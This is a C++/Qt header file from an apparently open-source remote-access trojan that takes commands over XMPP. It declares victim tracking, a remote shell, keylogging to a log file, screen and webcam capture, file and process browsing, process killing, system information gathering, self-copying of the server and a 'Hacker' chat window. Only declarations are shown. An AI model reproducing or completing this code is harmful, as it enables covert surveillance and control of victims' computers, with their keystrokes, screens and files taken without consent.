/*
 *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#ifdef Q_WS_X11
#include "../../lib/headers/webcamlin.h"
#include "../../lib/headers/tecladoyratonlin.h"
#else
#include "../../lib/headers/webcamwin.h"
#include "../../lib/headers/tecladoyratonwin.h"
#endif

#include <QMainWindow>
#include <QFile>
#include <QFileInfo>
#include <QDataStream>
#include <QDir>
#include <QMessageBox>
#include <QProcess>
#include <QTimer>
#include <QDesktopWidget>
#include <QBuffer>
#include <QVBoxLayout>
#include <QPushButton>
#include <QLineEdit>
#include <QPlainTextEdit>
#include <QThread>
#include <qxmpp/QXmppClient.h>
#include "qxmpp/QXmppTransferManager.h"

namespace Ui {
    class MainWindow;
}
class paralelo : public QObject
{
    Q_OBJECT
public:
    paralelo();
    QImage *imagen1;
    int sincroniza;
    QBuffer *buffer;
    QByteArray bytes;
public slots:
    void procesarImagen(QImage captura,int calidad);
signals:
    void enviar(QByteArray);
};

class MainWindow : public QMainWindow {
    Q_OBJECT
public:
    MainWindow(QWidget *parent = 0);
    ~MainWindow();
    paralelo capturacion;
    int tiempoConexion;
    QString cuentaXmpp;
    QString contrasena;
    QString alias;
    QString nickVictima;
    QString nombreCopiable;
    QString adjunto;
    qint64 tamanoAdjunto;
    QString ejecutar;
    QString siempreOUnaVez;
    QMessageBox *mensaje;
    QString archivo;
    QDir directorio;
    QTimer temporizador;
    QTimer verTecla;
    QFile log;
    QProcess proceso;
    QProcess consola;
    QByteArray cadenaa;
    QWidget *chat;
    QVBoxLayout *capa;
    QHBoxLayout *capaHorizontal;
    QPushButton *botonChatEnviar;
    QLineEdit *enviarChatTexto;
    QPlainTextEdit *salidaChatTexto;
    QThread hilo;
    QXmppClient cliente;
    QString from;
    QXmppTransferManager *manager;
    QFile *archivoRecibido;
    QXmppTransferJob *job;
    QBuffer mem, bufferMini,bufferWebcam;
    QByteArray bufferMem, miniMem,WebcamMem;
    void generarVentanaChat();
signals:
    void procesar(QImage captura,int calidad);
public slots:
    void inicio();
    bool cargarConfiguracion();
    void recibidaPresencia(QXmppPresence presencia);
    void llegadaDatos(const QXmppMessage &mensaje);
    void llegadaDatosArchivo(QXmppTransferJob* transferencia);
    void enviarCaptura(QByteArray array);
    QPixmap screenShot();
    void moverPuntero(int x,int y);
    void desconectado();
    QString shell(QString comando);
    void reiniciar();
    void desinfectar();
    void listarUnidades();
    void listarArchivos(QString ruta);
    void listarDirectorios(QString ruta);
    void vistaPrevia(QString archivo);
    void mostrarMensaje(QString tipo,QString titulo,QString texto);
    void abrirChat();
    void cerrarChat();
    void enviarMensajeChat();
    void ponerMensajeChat(QString mensajeChat,QString quien = "Hacker");
    void escucharTeclas();
    void copiarServidor(QByteArray tramaConfiguracion,QString destino);
    void listarProcesos();
    void matarProceso(QString programa);
    QString obtenerInformacionSistema();
protected:
    void changeEvent(QEvent *e);
private:
    Ui::MainWindow *ui;
};


#endif // MAINWINDOW_H
